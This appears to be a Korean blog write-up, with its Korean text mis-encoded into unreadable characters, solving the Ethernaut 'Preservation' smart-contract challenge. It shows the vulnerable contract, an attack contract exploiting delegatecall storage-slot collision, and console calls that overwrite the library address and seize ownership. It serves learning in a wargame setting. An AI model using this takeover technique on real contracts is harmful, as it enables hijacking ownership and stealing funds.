---
emoji: ๐งข
title: (Ethernaut ์ทจ์ฝ์  16) Preservation
date: '2022-01-24 11:14:00'
author: ํ์ฑ์
tags: ethernaut Preservation vulnerability 
categories: ์ทจ์ฝ์ ๋ถ์
---


# ๐ 1. Preservation
__Difficulty 8/10__

- ์น๋ฆฌ ์กฐ๊ฑด
- ์ฝ๋ ๋ถ์
- ํ์ด
์์๋ก ์งํ ๋  ๊ฒ์ด๋ค.

- - -

## ์น๋ฆฌ ์กฐ๊ฑด
- instance์ ownership์ ๊ฐ์ ธ์ค๋ฉด ์น๋ฆฌํ๋ค.

- - -

## ์ฝ๋ ๋ถ์
์ด๋ฏธ ์ ์ค๋ช๋์ด์์ด ๊ฐ๋จํ ๋ถ์๋ง ์ฃผ์์ ์ ์๋ค!

```solidity
contract Preservation {
    
    // public library contracts 
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint storedTime; // slot 3

    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    // timeZone์ ๋ํ LibraryAddress ๋ฑ๋ก ๋ฐ owner ๋ฑ๋ก
    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
    }
    

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {

    // stores a timestamp 
    uint storedTime;  

    function setTime(uint _time) public {
        storedTime = _time;
    }
}
```
- - -

## ํ์ด
์ด ๋ฌธ์ ์์ ์ฐ๋ฆฌ์ ๋ชฉํ๋ ownership์ ๊ฐ์ ธ์ค๋ ๊ฒ์ด๋ค.

์ฌ๊ธฐ์ ์ฐ๋ฆฌ๊ฐ ๊ผญ ์์์ผํ๋ ๊ฐ๋์ delegate call์ด๋ค. ๋๋ delegate call์ ๋ํด์ 2๋ฒ์ด๋ ๋ค๋ค์ง๋ง ์ด ๋ฌธ์ ๋ฅผ ํ๊ธฐ ์ ๊น์ง ๋ชจํธํ๋ ๊ฒ ๊ฐ๋ค.
์ด ๋ฌธ์ ๋ฅผ ์๋ฒฝํ๊ฒ ์ดํดํ  ์ ์๋ค๋ฉด delegate call์ ๋ํด์ ์ข ๋ ํ์ ์ ๊ฐ์ง ์ ์์ ๊ฒ์ด๋ค.

### Delegate Call์ ๋ฌด์์ธ๊ฐ?
- [Delegate Call ์ทจ์ฝ์ ](https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/)
- [Delegation ethernaut ๋ฌธ์  6](https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/)

์ ๋งํฌ์์ delegate call์ ๋ํ ๊ฐ๋์ ๋ณต์ตํด๋ณด์! ~~๊ตฌ๊ธ์ ์ข์ ์๋ฃ๋ ๋ง์์ใใ~~

Delegate call์ call๊ณผ ๋น์ทํ์ง๋ง ๋ค๋ฅธ 2๊ฐ์ง ํน์ง์ ๋ ๊ฐ์ง๊ณ  ์๋ค.
1. ํธ์ถํ contract์ context๋ฅผ ๊ธฐ๋ฐ์ผ๋ก ๋์๋๋ค.
2. storage layout์ delegatecall์ ์ด์ฉํ๋ contract์ ๊ฐ์์ผํ๋ค.

1๋ฒ๊ณผ 2๋ฒ ํน์ง ๋ชจ๋ ์ด๋ฒ ๋ฌธ์ ์ ์ค์ํ key์ด๋ค.
1๋ฒ ํน์ง์ ๊ดํด์๋ ์ ๊ธ์์ ํ์ธํ  ์ ์๊ณ  2๋ฒ ํน์ง ๊ฐ์ ๊ฒฝ์ฐ [Privacy ๋ฌธ์  ethernaut 12](https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/)์์ ํ์ธ ํ  ์ ์๋ค.

### ํ์ด
์ฐ๋ฆฌ๊ฐ delegate call์ ๋ํ ์ง์์ด ๋ถ์กฑํ๋ค๋ฉด, `setFirstTime(uint _timeStamp)`์ด timeZone1Library์ `setTime`์ function์ ์คํ์ํค๊ณ  Preservation contract์ `storedTime`์ ๋ฐ๊ฟ ๊ฒ์ด๋ผ๊ณ  ์๊ฐํ  ๊ฒ์ด๋ค.
ํ์ง๋ง delegate call์ low level์ด๋ผ๋ ๊ฒ์ ๋ช์ฌํ์! ์ฆ delegate call์ storage ๊ธฐ๋ฐ์ด๋ค. LibraryContract์ `storedTime`์ slot 0๋ฅผ ์ฐจ์งํ๋ค. ๊ทธ๋ ๊ธฐ ๋๋ฌธ์ preservation contract์์ delegate call์ ํตํด setTime์ ํธ์ถํ๋ค๋ฉด ์ด๋ preservation contract์ `slot 0`๋ฅผ ๋ฐ๊พธ๋ ๊ฒ์ด๋ค.


~~์ด๋ป๊ฒ ์ค๋ช์ ๋ ์ ์ธ ์ ์์๊น...ใ ใ ~~ 

์ข ๋ ๊ฐ๋จํ๊ฒ ์ ๋ฆฌํด๋ณด์๋ฉด:
1. delegate call์ slot๊ธฐ๋ฐ์ผ๋ก ๋ฐ์ดํฐ๋ฅผ ๋ฐ๊ฟ ์ ์๋ค.(๋ณ์ ์ด๋ฆ X)
2. preservation contract์์ delegate call์ ํตํด LibraryContract.setTime()์ call ํ๋ค.
3. setTime์ LibraryContract์ slot 0์ ๋ฐ๊พธ๋ ํจ์์ด๋ค.
4. ์ฆ delegate call setTime์ ํตํด Preservation contract์ slot 0๋ฅผ ๋ฐ๊ฟ ์ ์๋ค. 

๊ทธ๋ ๋ค๋ฉด ์ฐ๋ฆฌ๊ฐ slot 0์ ์์์ ์ธ contract๋ก ๋ฐ๊พธ๋ฉด ์ด๋ป๊ฒ ๋ ๊น? 
`setFirstTime(uint _timeStamp)`์ ์์์ ์ธ contract์ ์ฃผ์๋ฅผ ๋งค๊ฐ๋ณ์๋ก ๋ฃ๋๋ค๋ฉด slot 0์ ์๋ timeZone1Library๊ฐ ์์์ ์ธ contract๋ก ๋ฐ๋ ๊ฒ์ด๊ณ  ์ฐ๋ฆฌ๋ delegate call์ ํน์ฑ์ ์ฌ์ฉํด slot๋ค์ ๋ง์๋๋ก ๋ฐ๊ฟ ์ ์๊ฒ๋๋ค.

๊ทธ๋ผ ํ๋ฒ ํ์ด๋ฅผ ๋ณด๋๋ก ํ์!
์ฐ์  ๊ณต๊ฒฉ์ ํ์ํ ์์์ ์ธ contract๋ฅผ ๋ง๋ ๋ค(on remix).
storage layout์ด Perservation๊ณผ ๊ฐ์์ผํ๋ค.

```solidity
contract PreservationAttack {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint storedTime; // slot 3

    // Perservation์์ setTime์ผ๋ก delegatecall์ ๋ณด๋ด๊ธฐ ๋๋ฌธ์ ์ด๋ฆ์ด ๋๊ฐ์์ผํ๋ค!
    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

attack contract๋ ์์ฑ์ด ๋์๋ค!
๊ทธ๋ผ ๊ณต๊ฒฉ์ ์๋๋ฆฌ์ค๋ฅผ ๋ณด์.
1. PreservationAttack๋ฅผ deployํ๋ค.
2. Preservation.setFirstTime()์ PreservationAttack์ ์ฃผ์์ ํจ๊ป ํธ์ถํ๋ค.
3. Preservation์ timeZone1Library๋ PreservationAttack๋ก ๋ณํ๋ค.
4. ํ๋ฒ ๋ setFirstTime()์ ํธ์ถํ๊ฒ๋๋ฉด LibraryContract๊ฐ ์๋ PreservationAttack์ setTime์ ํธ์ถํ๋ค.
5. setTime์ storage์ slot 2(owner)๋ฅผ msg.sender๋ก ๋ฐ๊พผ๋ค.
6. DONE!


๊ทธ๋ผ attack contract๋ฅผ deployํ ํ console ์ฐฝ์์๋ ๋ฌด์์ด ์ด๋ฃจ์ด์ง๋์ง ํ์ธํด๋ณด์.

๋ชจ๋  ์ฝ๋๋ console์ฐฝ์์ ์ด๋ฃจ์ด์ง๋ค. 
ctrl + shift + i๋ฅผ ๋๋ฌ console์ฐฝ์ ํ์ฑํ ์ํค์
```javascript
// ๊ธฐ์กด์ timeZone1Library๋ฅผ ํ์ธํ๋ค.
await contract.timeZone1Library()

// attack contract์ ์ฃผ์๋ฅผ ๋งค๊ฐ๋ณ์๋กํ์ฌ setFirstTime์ ํธ์ถํ๋ค.
await contract.setFirstTime("0x6bF70e10D96F41F8AE2C3EDbe017ECEc5242C50D")

// timeZone1Library๊ฐ attack contract์ ์ฃผ์๋ก ๋ฐ๋ ๊ฒ์ ํ์ธํ  ์ ์๋ค.
await contract.timeZone1Library()

// setFirstTime์ delegatecall์ ํ์ฉํ์ฌ attack contract์ setTime์ ํธ์ถํ๋ค. 
// ์ด๋ ๋งค๊ฐ๋ณ์๋ ๋ฌด์์ด ๋์ด๋ ์๊ด์๋ค.
// ์๋ํ๋ฉด attack contract์ setTime์ ๋งค๊ฐ ๋ณ์๋ฅผ ์ฌ์ฉํ์ง ์๋๋ค.
await contract.setFirstTime("0123456789")

// owner๊ฐ ์์ ์ด ๋ ๊ฒ์ ํ์ธํ  ์ ์๋ค.
await contract.owner()
```


์๋ฃ ํ ethernaut์ผ๋ก ๋์์ Submit instance๋ฅผ ๋๋ฅด๊ณ  ์กฐ๊ธ ๊ธฐ๋ค๋ฆฌ๋ฉด block์ด mine๋๊ณ , ์๋์ ๊ฐ์ด ๋จ๋ฉฐ ๋ง๋ฌด๋ฆฌ๋๋ค.
```
ูฉ(- ฬฎฬฎฬ-ฬ)?ถ Well done, You have completed this level!!!
```
- - -

## ๋ง๋ฌด๋ฆฌ
์ด๋ฒ ๋ฌธ์ ๋ [delegation](https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/) ๋ฌธ์ ๋ ๋ณด๋ค delegate call์ ๋ํด ์ข ๋ ๊น์ด ์ดํดํ  ์ ์์๋ ๊ธฐํ์๋ ๊ฒ ๊ฐ๋ค. ์์งํ ์ง๊ธ๊น์ง๋ delegate call์ด ๋์๊ฒ ๊ฐ์ฅ ์ด๋ ค์ด ์ปจ์์ด์๋ค. ์์ผ๋ก๋ ๋ฐฐ์ธ ๊ฒ์ด ๋ง์ผ๋ ๊พธ์คํ ๊ณต๋ถํด๋ณด์ :)!

- - -
## REF
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- DelegateCall ์ทจ์ฝ์  :https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/
- Solidity Docs delegate call: https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html

```toc

```